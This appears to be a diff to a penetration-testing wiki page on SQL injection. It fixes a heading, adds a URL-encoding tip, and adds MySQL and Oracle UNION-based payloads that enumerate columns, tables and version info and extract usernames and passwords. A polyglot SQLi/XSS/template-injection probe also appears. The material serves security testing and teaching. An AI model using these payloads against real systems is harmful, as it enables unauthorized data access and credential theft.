@@ -14,7 +14,11 @@ Testers need to identify input vectors (parts of the app that accept content fro
 
 Using special SQL characters (`'`, `"`, `#`, `;`, `)`, `*`,`%`) in an input could lead to SQL errors sometimes echoed back to the users for debugging. This would indicate an entry point not sanitized enough and thus potentially vulnerable to SQL injection.
 
-### Manuel testing
+{% hint style="info" %}
+For every payload do not forget to try url encoding or others.
+{% endhint %}
+
+### Manual testing
 
 With `some.website/?parameter=value` some basic useful payload to detect vulnerable inputs are:
 
@@ -47,6 +51,62 @@ The following payload is used for testing SQL injections, [XSS (Cross-Site Scrip
 ```
 '"<svg/onload=prompt(5);>{{7*7}}
 ```
+
+#### Extracting information with UNION
+
+{% tabs %}
+{% tab title="MySQL" %}
+1\. Finding number of columns:
+
+```sql
+' ORDER BY 2 -- # iterate until error to find number of columns
+```
+
+2\. Extract database information:
+
+```sql
+' UNION SELECT @@version, NULL -- # Inserting null depending on number of columns
+```
+
+3\. Find tables name:
+
+```sql
+' UNION SELECT NULL,concat(COLUMN_NAME) from information_schema.columns where table_name='users' --
+```
+
+4\. Retrieve information from table:
+
+```sql
+' UNION SELECT username,password from users --
+```
+{% endtab %}
+
+{% tab title="Oracle" %}
+1\. Finding number of columns:
+
+```sql
+' ORDER BY 2 -- # iterate until error to find number of columns
+```
+
+2\. Extract database information:
+
+```sql
+' UNION SELECT banner,NULL from v$version --
+```
+
+3\. Find tables name:
+
+```sql
+' UNION SELECT table_name,NULL from all_tables --
+```
+
+4\. Retrieve information from table:
+
+```sql
+' UNION SELECT username,password from users --
+```
+{% endtab %}
+{% endtabs %}
 
 ### Automated tests
 
@@ -97,3 +157,5 @@ SQL injection cheatsheets (MSSQL, MySQL, Oracle SQL, Postgres SQL, ...)
 {% endembed %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}
+
+{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}
